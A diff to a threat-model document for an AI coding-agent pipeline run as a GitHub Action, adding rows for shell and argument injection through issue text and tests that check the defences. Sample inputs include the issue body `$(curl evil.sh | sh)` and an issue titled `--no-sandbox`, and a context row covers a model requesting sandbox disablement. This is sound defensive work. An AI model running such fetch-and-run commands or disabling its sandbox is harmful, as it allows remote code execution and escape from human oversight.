@@ -69,6 +69,8 @@ Layers: **P** = prompt rules · **G** = guard hook · **S** = OS sandbox · **C*
 | T10 | Untested code shipped without review | `--yes` on a repo with no tests | C (no auto-deploy when untested unless `--allow-untested`), NOT TESTED label in the gate and the PR | `Pipeline.ship()` |
 | T11 | Runaway cost | Infinite tool loop | C (budget checked before each agent and passed to the SDK as `max_budget_usd`), `max_turns`, debug-attempt cap | `_run_agent()`, `runner._options()` |
 | T12 | Sandbox escape requested by the model | `dangerouslyDisableSandbox: true` | S (`allowUnsandboxedCommands: false`), G (denies the flag) | `agent_sandbox()`, `check_tool()` |
+| T13 | Shell injection through issue text (GitHub Action) | Issue body `$(curl evil.sh \| sh)` | C (issue text only passes through `with:` and environment variables, never `${{ }}` inside `run:`) | [action.yml](../action.yml), `tests/test_action.py` |
+| T14 | Argument injection through issue text | Issue titled `--no-sandbox` | C (the task is always passed after `--`), write-access check on the labeler, H (PR review) | [action.yml](../action.yml), [GITHUB_ACTION.md](GITHUB_ACTION.md) |
 
 ## 5. Evidence
 
@@ -81,6 +83,7 @@ Each defence is checked automatically (`make check`), and the OS-level ones were
 | The sandbox catches what the guard misses | `test_sandbox_catches_what_the_guard_misses` | An obfuscated `curl` succeeds unsandboxed and is blocked when sandboxed |
 | The agent sandbox (Claude Code) blocks network and outside writes | – | 2026-11-05, real agent: writing in the repo ✅; `curl https://example.com` → `deny network-outbound`; `echo > ~/probe` → `operation not permitted` |
 | Secret scanner | `tests/test_security.py`, `test_scanner_catches_secrets_hidden_in_ordinary_files` | – |
+| The GitHub Action resists shell and argument injection from issue text | `tests/test_action.py` (runs the real step script with hostile issue text) | – |
 | Deploy refused on secrets, budget, untested + `--yes` | `tests/test_pipeline.py::test_secret_file_blocks_deploy`, `test_spending_limit_stops_run`, `test_yes_mode_refuses_untested_deploy` | – |
 | Injection alerts trigger only on the explicit marker | `test_injection_alert_only_on_marker` | A false positive was found in a live run and fixed |
 
